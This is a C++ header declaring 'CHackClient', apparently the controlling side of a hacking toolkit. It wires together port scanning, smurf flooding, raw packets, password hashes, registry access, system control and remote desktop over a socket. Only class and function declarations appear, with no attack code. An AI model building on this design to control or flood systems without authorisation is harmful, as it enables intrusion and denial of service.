
#ifndef HACKCLIENT_H
#define HACKCLIENT_H
#include "stdafx.h"
#include "resource.h"
#include "HackPro.h"
#include "MacAddrDlg.h"
#include "Portscandlg.h"
#include "PortScanSip.h"
#include "smurfdlg.h"
#include "RawPacketdlg.h"

#include "pwdhash.h"
#include "wndlist.h"
#include "SysInfo.h"
#include "papahead.h"
#include "SysCtrl.h"
#include "RegConfigDlg.h"
#include "Desktop.h"


typedef void* (*Function)(void* InData,int size);
class CHackClient : public CSocket
{

	Fetch FBuff;
	void *Data;
public:
	//=============Differnt Pages Attached to this class==============
	CDesktop Page_RemoteDesktop;
	CRegConfigDlg Page_RegConfig;
	//CPwdHash Page_PwdHash;
	CWndList Page_WndList;
	SysInfo  Page_SysInfo;
	SysCtrl  Page_SysCtrl;
	CString HostIP;	
	Function FT[20];
	
	CHackClient();
	bool Connect(char* ip);
	virtual ~CHackClient();
	virtual void OnReceive(int nErrorCode);
	void ProcessIntr(int function,int callback,int datasize,void* data);
	void SendRequest(int function,int callback,int datasize,void* data);
	void Error(char* msg,int error);
	virtual void OnClose(int nErrorCode);
};

#endif
